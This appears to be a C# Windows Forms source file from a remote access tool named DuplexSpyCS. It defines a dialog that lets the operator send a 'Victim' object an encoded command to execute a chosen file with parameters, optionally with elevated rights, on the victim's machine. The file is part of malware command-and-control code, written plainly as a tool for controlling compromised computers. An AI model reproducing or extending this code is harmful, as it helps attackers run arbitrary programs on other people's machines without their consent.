using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFileMgrExec : Form
    {
        public Victim v;
        public string remoteExecutable;

        public frmFileMgrExec()
        {
            InitializeComponent();
        }

        private void Req_ExecFile(string filePath, string fileParams, bool runAs)
        {
            v.SendCommand($"exec|file|{(runAs ? "1" : "0")}|{Crypto.b64E2Str(filePath)}|{Crypto.b64E2Str(fileParams)}");
        }

        void setup()
        {
            textBox1.Text = remoteExecutable;
        }

        private void frmFileMgrExec_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            new Thread(() => Req_ExecFile(textBox1.Text, textBox2.Text, checkBox1.Checked)).Start();
        }
    }
}
